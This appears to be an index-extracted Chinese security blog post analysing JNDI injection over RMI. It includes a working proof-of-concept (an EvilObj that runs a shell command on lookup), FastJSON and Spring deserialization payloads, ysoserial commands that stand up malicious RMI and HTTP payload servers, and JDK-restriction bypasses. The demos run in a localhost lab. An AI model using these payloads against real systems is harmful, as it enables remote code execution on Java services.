Naming   Manager \u4e5f \u5b58\u5728 \u4e00\u4e2a \u52a8\u6001 \u52a0\u8f7d \u673a\u5236 \u5e76\u4e14 \u5176 \u5728 \u4fee\u590d \u524d \u5e76 \u65e0 \u9650\u5236 \uff0c \u8fd9\u91cc Naming   Manager \u90e8\u5206 \u7528\u5230 \u7684 \u662f JNDI \u7684 Naming   References   In   order   to   bind   Java   objects   in   a   Naming   or   Directory   service ,   it   is   possible   to   use   Java   serialization   to   get   the   byte   array   representation   of   an   object   at   a   given   state .   However ,   it   is   not   always   possible   to   bind   the   serialized   state   of   an   object   because   it   might   be   too   large   or   it   might   be   inadequate .   For   such   needs ,   JNDI   defined   Naming   References   ( or   just   References   from   now   on )   so   that   objects   could   be   stored   in   the   Naming   or   Directory   service   indirectly   by   binding   a   reference   that   could   be   decoded   by   the   Naming   Manager   and   resolved   to   the   original   object .   https : / / www . blackhat . com / docs / us - 16 / materials / us - 16 - Munoz - A - Journey - From - JNDI - LDAP - Manipulation - To - RCE - wp . pdf   \u8fd9\u91cc \u63d0\u5230 \u7531\u4e8e \u67d0\u4e9b \u60c5\u51b5 \u4e0d\u80fd \u76f4\u63a5 \u5c06 \u8fdc\u7a0b obj \u8fd4\u56de \uff0c \u6240\u4ee5 JNDI \u63d0\u51fa \u4e86 Naming   References \u7684 \u65b9\u6cd5 \uff0c \u8fd4\u56de \u76f8\u5e94 \u7684 Reference \u800c \u4e0d \u8fd4\u56de \u5177\u4f53 \u7684 obj \u3002 \u7edf\u4e00 \u7531 JNDI \u7684 \u8bf7\u6c42 \u7aef \u53bb \u52a0\u8f7d \u6307\u5b9a \u7684 \u5730\u5740 \u4e0a \u7684 obj \u3002 \u8fd9\u91cc \u52a0\u8f7d \u65b9\u6cd5 \u4e2d \u5c31 \u5305\u62ec \u8fdc\u7a0b codebase \u7684 \u65b9\u6cd5 \uff0c \u6765\u770b \u4e2a \u4f8b\u5b50   String   FactoryURL   =   \" http : / / some - evil - server \"   ;   Reference   reference   =   new   Reference   (   \" MyClass \"   ,   \" MyClass \"   ,   FactoryURL   ) ;   ReferenceWrapper   wrapper   =   new   ReferenceWrapper   (   reference   ) ;   ctx   .   bind   (   \" Foo \"   ,   wrapper   ) ;   / /   \u7ed1\u5b9a reference   \u8bf7\u6c42 \u7aef\u4ee5 lookup \u8bf7\u6c42 \u4e0a\u8ff0 \u7ed1\u5b9a \u7684 RMI \u670d\u52a1 \u5373\u53ef \u3002 \u5176 \u5904\u7406 \u7406\u8fc7 \u8fc7\u7a0b \u5904\u7406\u8fc7\u7a0b \u5f15\u7528 https : / / www . blackhat . com / docs / us - 16 / materials / us - 16 - Munoz - A - Journey - From - JNDI - LDAP - Manipulation - To - RCE - wp . pdf","title":"JNDI \u7684 \u76f8\u5173 \u6982\u5ff5"},{"location":"blog/2020/jndi-with-rmi-20200209/#0x02","text":"","title":"0x02   \u539f\u7406"},{"location":"blog/2020/jndi-with-rmi-20200209/#jndi-with-rmi-demo","text":"\u4e3a\u4e86 \u66f4\u597d \u7684 \u8bf4\u660e \uff0c \u4ee5 \u4e0b\u9762 \u7684 \u4ee3\u7801 \u4e3a\u4f8b   package   train . jndi   ;   import   com . sun . jndi . rmi . registry . ReferenceWrapper   ;   import   javax . naming . Reference   ;   import   java . rmi . registry . LocateRegistry   ;   import   java . rmi . registry . Registry   ;   / * *   *   @ author   wh1t3P1g   *   @ since   2020 / 2 / 4   * /   public   class   Server   {   public   static   void   main   (   String   [ ]   args   )   throws   Exception   {   Registry   registry   =   LocateRegistry   .   createRegistry   (   1099   ) ;   String   FactoryURL   =   \" http : / / localhost / \"   ;   Reference   reference   =   new   Reference   (   \" EvilObj \"   ,   \" EvilObj \"   ,   FactoryURL   ) ;   ReferenceWrapper   wrapper   =   new   ReferenceWrapper   (   reference   ) ;   registry   .   bind   (   \" Foo \"   ,   wrapper   ) ;   }   }   Server \u7aef\u4ee5 RMI   Registry \u6ce8\u518c \u4e00\u4e2a Reference \uff0c \u5e76 \u5c06 factoryURL \u6307\u5b9a \u4e3a localhost   package   train . jndi   ;   import   javax . naming . Context   ;   import   javax . naming . InitialContext   ;   / * *   *   @ author   wh1t3P1g   *   @ since   2020 / 2 / 4   * /   public   class   Client   {   public   static   void   main   (   String   [ ]   args   )   throws   Exception   {   Context   ctx   =   new   InitialContext   ( ) ;   ctx   .   lookup   (   \" rmi : / / localhost : 1099 / Foo \"   ) ;   }   }   Client \u7aef \u6bd4\u8f83 \u7b80\u5355 \u6bd4\u8f83\u7b80\u5355 \uff0c \u76f4\u63a5 \u4ee5 lookup \u6307\u5b9a \u7684 RMI   URL \u5373\u53ef \u3002 \u6839\u636e \u4e0a\u9762 \u7684 \u8fc7\u7a0b \u56fe \uff0c \u6211\u4eec \u53ef\u4ee5 \u77e5\u9053 \u7684 \u662f \u6700\u7ec8 \u6267\u884c EvilObj \u7684 \u5730\u65b9 \u662f Client \u7aef ( jndi \u53d1\u8d77 lookup \u7684 \u65b9\u6cd5 ) \u3002 \u6700\u540e \u6211\u4eec \u521b \u4e00\u4e2a EvilObj   / * *   *   @ author   wh1t3P1g   *   @ since   2020 / 2 / 4   * /   public   class   EvilObj   {   public   EvilObj   ( )   throws   Exception   {   Runtime   rt   =   Runtime   .   getRuntime   ( ) ;   String   [ ]   commands   =   {   \" / bin / sh \"   ,   \" - c \"   ,   \" open   / System / Applications / Calculator . app \"   } ;   rt   .   exec   (   commands   ) ;   }   }   javac   EvilObj . java   \u751f\u6210 EvilObj . class \uff0c \u7136\u540e \u6302\u8f7d \u5230 \u4e00\u4e2a web \u670d\u52a1 \u4e0a \u5c31 \u53ef\u4ee5 \u4e86 \u3002 \u53ef\u4ee5 \u76f4\u63a5 \u9009\u62e9 python \u6765 \u6302\u8f7d   \u90a3\u4e48 \u6211\u4eec \u6765 \u5177\u4f53 \u770b \u4e00\u4e0b lookup \u51fd\u6570 \u5177\u4f53 \u505a \u4e86 \u4ec0\u4e48   \u9996\u5148 InitialContext \u7684 lookup \u51fd\u6570 \uff0c \u4f1a \u6839\u636e \u63d0\u4f9b \u7684 URL \u81ea\u52a8 \u9009\u62e9 \u5408\u9002 \u7684 InitialContext \uff08 \u5206\u79bb \u51fa \u534f\u8bae \u540e \u8fdb\u884c \u9009\u62e9 \uff09 \uff0c \u6bd4\u5982 \u6b64\u65f6 \u7684 InitialContext \u4e3a rmiURLContext   \u7ee7\u7eed \u8ddf\u8fdb   com / sun / jndi / toolkit / url / GenericURLContext . java # lookup   \u8fd9\u91cc \u7684 ctx \u4e3a RegistryContext \uff0c \u5c06 \u5bf9 \u6307\u5b9a \u7684 RMI   Registry \u83b7\u53d6 \u7ed1\u5b9a \u7684 obj   \u83b7\u53d6 \u5230 \u8fdc\u7a0b \u5bf9\u8c61 \uff0c \u5e76 \u8c03\u7528 decodeObject \u51fd\u6570   \u5982\u679c \u5f53\u524d \u7684 remote \u5bf9\u8c61 \u662f RemoteReference \u7c7b\u578b \uff0c \u5219 \u4e00\u6b65 \u8fdb\u4e00\u6b65 \u8bf7\u6c42 Registry \u83b7\u53d6 \u8be5 Reference \u7684 \u5185\u5bb9 \u3002 \u5230 \u8fd9\u91cc \u4e3a\u6b62 \uff0c \u6211\u4eec \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u7684 \u8bf7\u6c42 \u5c31 \u540c Server \u7aef\u7684 \u5173\u7cfb \u4e0d\u5927 \u5173\u7cfb\u4e0d\u5927 \u4e86 \uff0c Client \u4f1a \u6839\u636e \u62ff\u5230 \u7684 Reference \u8bf7\u6c42 \u76f8\u5e94 \u7684 \u670d\u52a1 \u52a1\u5668 \u670d\u52a1\u5668   \u7ee7\u7eed \u8ddf\u8fdb getObjectInstance   \u8fd9\u91cc \u4f1a \u7ee7\u7eed \u8c03\u7528 NamingManager \u7684 getObjectFactoryFromReference \uff0c \u8be5 \u51fd\u6570 \u5b8c\u6210 \u4e86 \u5411 FactoryURL \u8bf7\u6c42 \u5177\u4f53 \u7684 class \u6587\u4ef6 \u7684 \u529f\u80fd \u3002   \u8fd9\u91cc \u53ef\u4ee5 \u770b\u5230 \uff0c \u6839\u636e factoryName \u548c codebase \u5c06 \u8fdc\u7a0b \u8f7d\u5165 \u76f8\u5e94 \u7684 class \u6587\u4ef6 ( \u8fd9\u91cc \u7684 loadClass \u7528 \u7684 URLClassLoader \u6765 \u5b8c\u6210 \u4efb\u52a1 )   \u5e76 \u5728 \u7b2c 163 \u884c\u5bf9 \u8f7d\u5165 \u7684 obj \u8fdb\u884c \u521d\u59cb \u521d\u59cb\u5316 \uff0c \u8fd9 \u4e5f \u5c31\u662f \u4ec0\u4e48 \u4e3a\u4ec0\u4e48 \u6211\u4eec \u9700\u8981 \u628a payload \u5199 \u5728 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570 \u91cc \u3002   \u5728 \u5229\u7528 \u4e2d \uff0c lookup \u51fd\u6570 \u7684 \u53c2\u6570 \u5fc5\u987b \u662f \u53ef\u63a7 \u7684 \uff0c \u6216\u8005 \u5229\u7528 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u7684 \u65b9\u5f0f \u6765 \u5b8c\u6210 \uff0c \u6bd4\u5982 \u4e0b\u9762 \u7684 \u4e24\u4e2a \u6848\u4f8b","title":"JNDI   with   RMI   DEMO"},{"location":"blog/2020/jndi-with-rmi-20200209/#springjtatransactionmanager","text":"16 \u5e74 \u7684 \u65f6\u5019 Spring \u6846\u67b6 \u66b4\u4e86 \u4e00\u4e2a \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u53ef \u5229\u7528 \u70b9 JtaTransactionManager \uff0c \u5176 \u539f\u7406 \u5c31\u662f \u5229\u7528 \u4e86 JNDI   \u53ef\u63a7 \u7684 lookup \u53c2\u6570 \uff08 \u8fd9\u91cc \u7684 \u53ef\u63a7 \u7531 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6765 \u5b8c\u6210 \uff09 \u3002 \u6765\u770b \u4e00\u4e0b \u539f\u7406   org / springframework / transaction / jta / JtaTransactionManager . java # readObject   \u8fd9\u91cc 1230 \u884c \u521d\u59cb \u521d\u59cb\u5316 \u4e86 \u4e00\u4e2a jdni \u7684 context \uff0c \u8fd9\u4e2a context \u5c06 \u7528\u4e8e \u540e\u7eed \u7684 JNDI   lookup   \u7ee7\u7eed \u8ddf\u8fdb initUserTransactionAndTranscationManager   \u7ee7\u7eed \u8ddf\u8fdb lookupUserTransaction   \u8fd9\u91cc \u6700\u7ec8 \u8c03\u7528 \u4e86 context \u7684 lookup \u51fd\u6570 \uff0c \u5e76\u4e14 \u5176 \u53c2\u6570 \u4e3a userTransactionName \uff0c \u8fd9\u4e2a \u90e8\u5206 \u6211\u4eec \u53ef\u4ee5 \u5728 \u5e8f\u5217 \u5e8f\u5217\u5316 \u524d \u8fdb\u884c \u6784\u9020 \uff0c \u4f8b\u5982 \u4e0b\u9762 \u7684 \u4ee3\u7801 ( \u66f4\u65b0 \u5728 \u4e86 ysoserial \u7684 spring3 \u4e0a )   \u5230 \u4e86 \u5982\u4eca 2020 \u5e74 \uff0c \u8fd9\u4e2a \u7c7b \u7684 \u5229\u7528 \u4ecd\u7136 \u5b58\u5728 \u4e8e \u6700\u65b0 \u65b0\u7248 \u6700\u65b0\u7248 \u7684 Spring - tx \u7ec4\u4ef6 \u4e0a XD","title":"\u6848\u4f8b \u4e00 \uff1a Spring \u6846\u67b6 \u7684 JtaTransactionManager \u7c7b"},{"location":"blog/2020/jndi-with-rmi-20200209/#fastjsonpoc-jdbcrowsetimpl","text":"fastjson \u7531\u4e8e   @ type   \u7684 \u5b58\u5728 \uff0c \u5728 \u53d7 \u5f71\u54cd \u7684 \u7248\u672c \u4e2d \uff0c \u5176 \u53ef\u4ee5 \u5bf9 \u4efb\u610f \u6307\u5b9a \u7684 \u5bf9\u8c61 \u8fdb\u884c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u6839\u636e \u89c4\u5219 \u81ea\u52a8 \u8c03\u7528 setter / getter \u6765 \u8fbe\u5230 \u5b9e\u4f8b \u8fd8\u539f \u7684 \u76ee\u7684 \u3002 \u9996\u5148 \u6765\u770b \u4e00\u4e0b POC   {   \" @ type \"   :   \" com . sun . rowset . JdbcRowSetImpl \"   ,   \" dataSourceName \"   :   \" rmi : / / localhost : 1099 / obj \"   ,   \" autoCommit \"   :   true   }   \u8fd9\u91cc \u7684 \u5173\u952e \u5728\u4e8e \u5173\u952e\u5728\u4e8e autoCommit \uff0c \u6765\u770b \u4e00\u4e0b JdbcRowSetImpl \u7684 setAutoCommit \u51fd\u6570   \u8fd9\u91cc \u5982\u679c conn \u4e3a null \u7684\u8bdd \uff0c \u4f1a \u8c03\u7528 connect \u51fd\u6570 \uff0c \u770b \u4e00\u4e0b connect \u51fd\u6570   \u770b\u5230 \u8fd9\u91cc \u7528 JNDI \u8fdb\u884c \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u8fde\u63a5 \uff0c \u5e76\u4e14 \u7531\u4e8e fastjson \u7684 \u7279\u6027 dataSource \u662f \u53ef\u63a7 \u7684 \uff0c \u8fd9 \u5c31 \u610f\u5473 \u610f\u5473\u7740 \u6211\u4eec \u53ef\u4ee5 \u63a7\u5236 lookup \u7684 \u53c2\u6570 \uff0c \u5e76 \u5411 \u6076\u610f \u7684 server \u53d1\u8d77 JNDI \u8fde\u63a5 \u3002 \u6839\u636e \u524d \u6587\u8bf4 \u7684 \u539f\u7406 \uff0c \u6211\u4eec \u53ef\u4ee5 \u4f7f\u5f97 \u4e3b\u673a \u6267\u884c \u4efb\u610f \u4ee3\u7801 \u3002","title":"\u6848\u4f8b \u4e8c \uff1a FastJSON \u53cd \u5e8f\u5217\u5316 POC   JdbcRowSetImpl \u7c7b"},{"location":"blog/2020/jndi-with-rmi-20200209/#0x03","text":"","title":"0x03   \u73af\u5883 \u590d\u73b0"},{"location":"blog/2020/jndi-with-rmi-20200209/#jrmplistener","text":"\u7531\u4e8e JNDI \u5e95\u5c42 \u7528 \u7684 \u90fd \u662f RMI \u7684 \u4e1c\u897f \uff0c \u6240\u4ee5 \u6211\u4eec \u8981 \u5efa\u7acb \u4e00\u4e2a \u7ed1\u5b9a \u4e86 Reference \u7684 RMI \u670d\u52a1 \uff0c \u53ef\u4ee5 \u76f4\u63a5 \u6539\u6539 JRMPListener \u3002   \u5728 RMI \u90e8\u5206 \u66fe\u7ecf \u5206\u6790 \u8fc7 JRMPListener \uff0c \u5176 \u8fd4\u56de \u4e86 ExceptionalReturn \uff0c \u4f7f\u5f97 \u6784\u9020 \u597d \u7684 Exception \u5728 Client \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6267\u884c \u547d\u4ee4 \u6267\u884c\u547d\u4ee4 \u3002 \u800c \u5bf9\u4e8e \u7ed1\u5b9a Reference \uff0c \u6211\u4eec \u9700\u8981 \u4fee\u6539 ExceptionalReturn \u4e3a NormalReturn \u5e76 \u5c06 payloadObject \u6539\u4e3a ReferenceWrapper   payloadObject \u6539\u4e3a ReferenceWrapper   \u4f46\u662f \u5728 \u5b9e\u9645 \u6d4b\u8bd5 \u65f6 \uff0c \u53d1\u73b0 Client \u8bf7\u6c42 \u540e \u4e0d\u80fd \u5b8c\u5168 \u9000\u51fa \u3002 \u5176\u5b9e \u6211\u4eec \u4e5f \u53ef\u4ee5 \u76f4\u63a5 \u7528 \u4e0a\u9762 \u7684 \u4f8b\u5b50   \u4e0d\u8fc7 \u8fd9\u91cc \u5c31 \u83b7\u53d6 \u4e0d\u5230 \u662f\u5426 \u6709 \u8bbf\u95ee \u8fdb\u6765 \uff0c \u6839\u636e \u5b9e\u9645 \u7684 \u73af\u5883 \u53d6\u820d \u5427 XD   \u6539\u9020 \u540e \u7684 \u5df2 \u66f4\u65b0 \u5230   github   \u4e0a   / /   \u5f00\u542f \u6302\u8f7d \u4e86 evil   class \u6587\u4ef6 \u7684 HTTP   Server   java   - cp   target / ysoserial - 0.0 . 6 - SNAPSHOT - all . jar   ysoserial . exploit . PayloadHTTPServer   80   EvilObj   \" open   / System / Applications / Calculator . app \"   / /   \u5f00\u542f RMI   Reference   Listener   java   - cp   target / ysoserial - 0.0 . 6 - SNAPSHOT - all . jar   ysoserial . exploit . RMIRefListener   1099   EvilObj   http : / / localhost /   / /   \u6216\u8005 \u4f7f\u7528 RMIRefListener2 \uff0c \u96c6\u5408 \u4e86 \u4e0a\u9762 \u4e24\u4e2a \u6b65\u9aa4   java   - cp   target / ysoserial - 0.0 . 6 - SNAPSHOT - all . jar   ysoserial . exploit . RMIRefListener2   localhost : 1099   80   EvilObj   \" open   / System / Applications / Calculator . app \"","title":"\u6539\u9020 JRMPListener"},{"location":"blog/2020/jndi-with-rmi-20200209/#fastjson-1224-rce","text":"\u8fd9\u91cc \u6211\u4eec \u4ee5 FastJSON   1.2 . 24 \u7248\u672c \u7684 RCE \u4e3a\u4f8b \uff0c \u6765 \u8bd5\u9a8c JNDI   \u9996\u5148 \u5f00\u542f \u4e00\u4e2a evil   rmi   server   java   - cp   ysoserial - 0.0 . 6 - SNAPSHOT - all . jar   ysoserial . exploit . RMIRefListener2   host : 1099   80   EvilObj   \" touch   / tmp / success \"   \u7528   vulhub   \u7684 \u73af\u5883   \u5728 \u670d\u52a1 \u52a1\u5668 \u670d\u52a1\u5668 \u670d\u52a1\u5668\u7aef \u4f1a \u63a5\u6536 \u5230 \u8fde\u63a5   \u8fdb\u5230 docker \u91cc \u53ef\u4ee5 \u770b\u5230 \u751f\u6210 \u4e86 success \u6587\u4ef6","title":"FastJSON   1.2 . 24   RCE"},{"location":"blog/2020/jndi-with-rmi-20200209/#0x04","text":"\u524d\u6587 \u524d\u6587\u7528 \u7684 \u73af\u5883 \u662f JDK8u111 \uff0c \u5728 \u540e\u7eed \u7684 JDK8u113 \u4ee5\u53ca JDK6u132 ,   JDK7u122 \u4e4b\u540e \u589e\u52a0 \u4e86 \u5bf9 \u8fdc\u7a0b codebase \u7684 \u9650\u5236   \u7cfb\u7edf \u5c5e\u6027   com . sun . jndi . rmi . object . trustURLCodebase \u3001 com . sun . jndi . cosnaming . object . trustURLCodebase   \u7684 \u9ed8\u8ba4 \u9ed8\u8ba4\u503c \u53d8\u4e3a false \uff0c \u5373 \u9ed8\u8ba4 \u4e0d \u5141\u8bb8 \u4ece \u8fdc\u7a0b \u7684 Codebase \u52a0\u8f7d Reference \u5de5\u5382 \u7c7b \u3002 \u5982\u679c \u9700\u8981 \u5f00\u542f   RMI   Registry   \u6216\u8005   COS   Naming   Service   Provider \u7684 \u8fdc\u7a0b \u7c7b \u52a0\u8f7d \u529f\u80fd \uff0c \u9700\u8981 \u5c06 \u524d\u9762 \u8bf4 \u7684 \u4e24\u4e2a \u5c5e\u6027 \u503c \u8bbe\u7f6e \u4e3a true \u3002   Changelog :   JDK   6u141   http : / / www . oracle . com / technetwork / java / javase / overview - 156328 . html # R160 _ 141   JDK   7u131   http : / / www . oracle . com / technetwork / java / javase / 7u131 - relnotes - 3338543 . html   JDK   8u121   http : / / www . oracle . com / technetwork / java / javase / 8u121 - relnotes - 3315208 . html   \u6458\u81ea https : / / kingx . me / Restrictions - and - Bypass - of - JNDI - Manipulations - RCE . html   \u90a3\u4e48 \u5982\u679c \u5b58\u5728 \u8fd9\u6837 \u4e00\u4e2a \u6f0f\u6d1e \u4f46\u662f \u53c8 \u662f \u9ad8 \u7248\u672c \u7684 JDK \u73af\u5883 \uff0c \u8be5 \u600e\u4e48 \u8fdb\u884c bypass \u5462 \uff1f   \u627e\u5230 \u4e00\u4e2a \u53d7\u5bb3 \u53d7\u5bb3\u8005 \u672c\u5730 CLASSPATH \u4e2d \u7684 \u7c7b \u4f5c\u4e3a \u6076\u610f \u7684 Reference   Factory \u5de5\u5382 \u7c7b \uff0c \u5e76 \u5229\u7528 \u8fd9\u4e2a \u672c\u5730 \u7684 Factory \u7c7b \u6267\u884c \u547d\u4ee4 \u6267\u884c\u547d\u4ee4 \u3002   \u5229\u7528 LDAP \u76f4\u63a5 \u8fd4\u56de \u4e00\u4e2a \u6076\u610f \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u5bf9\u8c61 \uff0c JNDI \u6ce8\u5165 \u4f9d\u7136 \u4f1a \u5bf9 \u8be5 \u5bf9\u8c61 \u8fdb\u884c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u64cd\u4f5c \uff0c \u5229\u7528 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 Gadget \u5b8c\u6210 \u547d\u4ee4 \u6267\u884c \u3002   \u6458\u81ea https : / / kingx . me / Restrictions - and - Bypass - of - JNDI - Manipulations - RCE . html   \u4e0a\u9762 \u7684 \u8fd9 \u6587\u7ae0 \u7bc7\u6587\u7ae0 \u63d0\u51fa \u4e86 \u4e0a\u9762 \u4e24\u79cd \u65b9\u6848 \u6765 \u8fdb\u884c \u3002","title":"0x04   \u540e\u7eed"},{"location":"blog/2020/jndi-with-rmi-20200209/#_1","text":"\u5148 \u6765\u8bf4 \u4e00\u4e0b \u7b2c\u4e8c \u4e8c\u79cd \u7b2c\u4e8c\u79cd \uff0c \u8fd9\u91cc \u63d0\u5230 \u5229\u7528 \u7684 \u662f LDAP \uff0c \u8fd9\u90e8 \u90e8\u5206 \u8fd9\u90e8\u5206 \u6211\u4eec \u540e\u9762 \u518d \u8be6\u7ec6 \u53d9\u8ff0 \uff0c \u5176\u5b9e \u539f\u7406 \u8ddf RMI \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u95ee\u9898 \u662f \u4e00\u6837 \u7684 \u3002   \u6211 \u5728   \u6d45\u8c08 Java   RMI \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u95ee\u9898   \u4e2d\u66fe \u63d0\u5230 \u8fc7 \uff0c JRMPListener \u5229\u7528 \u7684 \u662f RMI   Client \u5728 \u63a5\u6536 Exception \u65f6 \u53d1\u751f \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \u3002 \u800c \u8fd9\u91cc \u7684 JNDI \u5e95\u5c42 \u7528 \u7684 \u4ecd\u7136 \u662f RMI \u90a3\u5957 ( \u5982\u679c \u534f\u8bae \u662f RMI \u7684\u8bdd ) \uff0c \u6240\u4ee5 \u6211\u4eec \u53d1\u8d77 \u4e00\u4e2a \u94fe\u63a5 \u5230 ysoserial \u7684 JRMPListener \u4e5f \u8fd8\u662f \u80fd \u6210\u529f \u5229\u7528 \u7684 \uff0c \u4e0d\u7ba1 \u6ca1\u6709 \u6709\u6ca1\u6709 \u8bbe\u7f6e   com . sun . jndi . rmi . object . trustURLCodebase   \u4e3a true \u3002 \u5f53\u7136 \u5982\u679c \u8981 \u5229\u7528 \u6210\u529f \uff0c \u53d1\u8d77 \u7aef \u5fc5\u987b \u8981 \u6709 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe\u6240 \u4f9d\u8d56 \u7684 \u7ec4\u4ef6 \u5e76\u4e14 \u5408\u9002 \u7684 JDK \u7248\u672c \u624d \u53ef\u4ee5 \u3002","title":"\u5229\u7528 \u5e95\u5c42 \u534f\u8bae \u5b9e\u73b0 \u4e0a \u7684 \u6f0f\u6d1e"},{"location":"blog/2020/jndi-with-rmi-20200209/#factory","text":"\u7136\u540e \u6211\u4eec \u6765 \u7ee7\u7eed \u770b\u770b \u7b2c\u4e00 \u4e00\u79cd \u7b2c\u4e00\u79cd \u60c5\u51b5   \u5728 \u524d\u9762 \u5206\u6790 NamingManager \u7684 getObjectFactoryFromReference \u65f6 \uff0c \u6211 \u7565\u8fc7 \u4e86 \u672c\u5730 \u7684 factory \u7684 \u8f7d\u5165 \u90e8\u5206 \u7684 \u4ee3\u7801   \u8fd9\u91cc \u9996\u5148 \u4f1a \u5728 \u672c\u5730 \u7684 CLASSPATH \u91cc \u627e \u8fd9\u4e2a factoryName \uff0c \u5982\u679c \u627e\u5230 \u4e86 \uff0c \u540e\u7eed \u5c31 \u4e0d\u7528 \u8fdb\u884c \u8fdc\u7a0b \u52a0\u8f7d \u3002 \u6240\u4ee5 \u5982\u679c \u672c\u5730 \u53ef\u4ee5 \u627e\u5230 \u4e00\u4e2a \u53ef \u5229\u7528 \u7684 factory \uff0c \u4e5f \u80fd \u7a81\u7834 JNDI \u7684 \u8fdc\u7a0b \u52a0\u8f7d \u7684 \u9650\u5236 \u3002   \u524d\u9762 \u7684 \u6587\u7ae0 \u4e2d \u63d0\u5230 \u4e86 tomcat \uff08 \u6216 glassfish \uff09 \u4e2d \u7684 BeanFactory \u7684 \u5229\u7528 \uff0c \u6765 \u5206\u6790 \u4e00\u4e0b   \u9996\u5148 \u5728 \u540e\u7eed \u7684 \u8c03\u7528 \u4e2d \uff0c factory \u7684 getObjectInstance \u51fd\u6570 \u5c06\u4f1a \u88ab \u8c03\u7528   / /   ref   \u4e3a \u6211\u4eec \u4f20\u5165 \u7684 Reference   \u53ef\u63a7   / /   name   \u4e3a factory \u7684 name \uff0c \u8fd9\u91cc \u5c31\u662f \u6211\u4eec \u81ea\u5df1 \u4f2a\u9020 \u7684 * EvilObj *   \u53ef\u63a7   factory   .   getObjectInstance   (   ref   ,   name   ,   nameCtx   ,   environment   ) ;   \u6765\u770b \u4e00\u4e0b BeanFactory \u4e2d getObjectInstance \u51fd\u6570 \u7684 \u5b9e\u73b0 \uff0c \u51fd\u6570 \u6709\u70b9 \u957f \uff0c \u6211\u4eec \u6311 \u91cd\u70b9 \u770b   if   (   obj   instanceof   ResourceRef   )   {   try   {   Reference   ref   =   (   Reference   )   obj   ;   String   beanClassName   =   ref   .   getClassName   ( ) ;   Class   < ? >   beanClass   =   null   ;   ClassLoader   tcl   =   Thread   .   currentThread   ( ) .   getContextClassLoader   ( ) ;   if   (   tcl   ! =   null   )   {   try   {   beanClass   =   tcl   .   loadClass   (   beanClassName   ) ;   / /   \u8f7d\u5165 \u6307\u5b9a class   }   catch   (   ClassNotFoundException   e   )   {   }   }   else   {   try   {   beanClass   =   Class   .   forName   (   beanClassName   ) ;   / /   \u8f7d\u5165 \u6307\u5b9a class   }   catch   (   ClassNotFoundException   e   )   {   e   .   printStackTrace   ( ) ;   }   }   / /   ...   / /   ...   Object   bean   =   beanClass   .   newInstance   ( ) ;   / /   \u5b9e\u4f8b \u5316   \u5148\u770b \u8fd9\u90e8 \u90e8\u5206 \u8fd9\u90e8\u5206 \u4ee3\u7801 \uff0c \u5f53\u524d \u6211\u4eec \u4f20\u5165 \u7684 Reference \u5fc5\u987b \u662f ResourceRef \u5bf9\u8c61 \uff0c \u5e76 \u5728 \u540e\u7eed \u52a0\u8f7d ResourceRef \u7684 beanClass \u548c shilihuanewInstance \u8fdb\u884c ( \u800c \u8fd9\u91cc \u7684 class \u6211\u4eec \u53ef\u4ee5 \u5728 \u8d4b\u503c \u65f6 \u968f\u610f \u6307\u5b9a ) \u3002   RefAddr   ra   =   ref   .   get   (   \" forceString \"   ) ;   Map   <   String   ,   Method   >   forced   =   new   HashMap   < >   ( ) ;   String   value   ;   if   (   ra   ! =   null   )   {   value   =   (   String   )   ra   .   getContent   ( ) ;   / /   ...   / *   Items   are   given   as   comma   separated   list   * /   for   (   String   param   :   value   .   split   (   \" , \"   ) )   {   param   =   param   .   trim   ( ) ;   index   =   param   .   indexOf   (   ' = '   ) ;   if   (   index   > =   0   )   {   / /   \u5982\u679c \u5185\u5bb9 \u4e2d \u5b58\u5728 = \uff0c \u63d0\u53d6 = \u540e\u9762 \u7684 \u5b57\u7b26 \u5b57\u7b26\u4e32 \u4f5c\u4e3a \u51fd\u6570 \u540d   setterName   =   param   .   substring   (   index   +   1   ) .   trim   ( ) ;   param   =   param   .   substring   (   0   ,   index   ) .   trim   ( ) ;   }   else   {   setterName   =   \" set \"   +   param   .   substring   (   0   ,   1   ) .   toUpperCase   (   Locale   .   ENGLISH   )   +   param   .   substring   (   1   ) ;   }   try   {   forced   .   put   (   param   ,   beanClass   .   getMethod   (   setterName   ,   paramTypes   ) ) ;   }   / /   ...   }   }   ReferenceRef \u5b58\u5728 \u7740 \u53ef\u63a7 \u7684 \u952e\u503c \u5bf9 \u5173\u7cfb \uff0c \u901a\u8fc7   get   \u51fd\u6570 \u83b7\u5f97 \uff0c \u5982 \u4e0a\u8ff0 \u4ee3\u7801   ref . get ( \" forceString \" )   \u5c06\u4f1a \u83b7\u5f97 forceString \u76f8\u5bf9 \u5e94 \u7684 RefAddr \uff0c \u901a\u8fc7 \u8c03\u7528 RefAddr \u7684 getContent \u51fd\u6570 \u5c31 \u53ef\u4ee5 \u83b7\u5f97 forceString \u952e \u5bf9\u5e94 \u7684 \u503c \u3002   \u8fd9\u91cc \u9700\u8981 \u6ce8\u610f \u7684 \u662f \uff0c \u5f53 forceString \u5bf9\u5e94 \u7684 \u5185\u5bb9 \u4e2d \u5b58\u5728   =   \u65f6 \uff0c \u5c06 \u622a\u53d6   =   \u540e\u9762 \u7684 \u5b57\u7b26 \u5b57\u7b26\u4e32 \u4f5c\u4e3a \u540e\u7eed \u8c03\u7528 \u7684 \u51fd\u6570 \u540d \u3002 \u8fd9 \u610f\u5473 \u610f\u5473\u7740 \u6211\u4eec \u53ef\u4ee5 \u4efb\u610f \u6307\u5b9a \u5f53\u524d \u5bf9\u8c61 \u7684 \u7c7b \u51fd\u6570 \u4e86 \u3002 force \u952e\u503c \u5bf9 \u4e2d\u5c06 \u5305\u542b   =   \u524d\u9762 \u7684 \u5185\u5bb9 \u548c \u76f8\u5e94 \u7684 Method \u5bf9\u8c61 \u3002 \u4f8b\u5982   test 